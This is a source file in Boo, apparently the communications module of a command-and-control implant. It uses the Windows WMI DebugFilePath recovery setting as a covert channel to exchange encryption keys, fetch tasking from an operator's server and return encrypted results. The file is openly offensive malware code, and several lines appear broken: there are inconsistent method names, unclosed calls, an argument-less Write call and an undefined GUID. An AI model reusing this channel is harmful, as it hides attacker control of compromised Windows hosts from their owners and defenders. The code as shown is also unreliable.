from System.Management import ManagementClass


class WMI:
    public DefaultDebugFilePathValue as string = "%SystemRoot%\\MEMORY.DMP"

    public def Read() as string:
        wmi_cls = ManagementClass('Win32_OSRecoveryConfiguration')
        instance = wmi_cls.GetInstances()
        for record in instance:
            return record["DebugFilePath"]

    public def Write(data as string):
        wmi_cls = ManagementClass('Win32_OSRecoveryConfiguration')
        instance = wmi_cls.GetInstances()
        for record in instance:
            record["DebugFilePath"] = data
            record.Put()
    
    public def WriteDefaultValue():
        Write(DefaultDebugFilePathValue)

class Comms:
    public Name as string = "wmi"
    public BaseUrl as Uri
    public JobsUrl as Uri
    private WMI as WMI = WMI()
    private Crypto as Crypto

    def constructor(guid as string, url as string):
        BaseUrl = Uri(urljoin(url, guid))
        JobsUrl = Uri(urljoin(BaseUrl, '/jobs'))

        # Listener URLs
        #self.base_url = URL  # This needs to be a tuple of callback domains (eventually)
        #self.jobs_url = Uri(urljoin(self.base_url, 'jobs'))

    public def KeyExchange():
        wmi_class_value = WMI.Read()
        if wmi_class_value == WMI.DefaultDebugFilePathValue:
            print "Writing kex"
            Crypto = Crypto()
            pub_key = Convert.ToBase64String(Encoding.UTF8.GetBytes(Crypto.public_key))
            WMI.Write("$(GUID):kex:client:$(pub_key)"

        while true:
            try:
                wmi_class_value = WMI.read()
                if wmi_class_value != WMI.DefaultDebugFilePathValue:
                    msg_guid, op, creator, data = @/:/.Split(wmi_class_value)
                    if msg_guid == GUID and op == "kex" and creator == "server":
                        print "Reading kex"
                        server_pubkey = Encoding.UTF8.GetString(Convert.FromBase64String(data))
                        Crypto.derive_key(server_pubkey)
                        WMI.WriteDefaultValue()
            except e as Exception:
                print "$(e)"

    public def SendJobResults(results as string, job_id as string):
        encrypted_results = Crypto.Encrypt(results)
        encoded_results = Convert.ToBase64String(encrypted_results)
        WMI.Write("$(GUID):job_results|$(job_id):client:$(encoded_results)")

    public def GetJob() as JsonJob:
        wmi_class_value = WMI.Read()
        if wmi_class_value == WMI.DefaultDebugFilePathValue:
            print "Requesting Job"
            WMI.write("$(GUID):jobs:client:gimme"

        print "Getting Job"
        wmi_class_value = WMI.Read()
        if wmi_class_value != WMI.DefaultDebugFilePathValue:
            msg_guid, op, creator, data = @/:/.Split(wmi_class_value)
            if msg_guid == GUID and op == "jobs" and creator == "server":
                WMI.Write()
                if len(data):
                    decrypted_data = Encoding.UTF8.GetString(Crypto.Decrypt(data))
                    return JavaScriptSerializer().Deserialize[of JsonJob](decrypted_data)
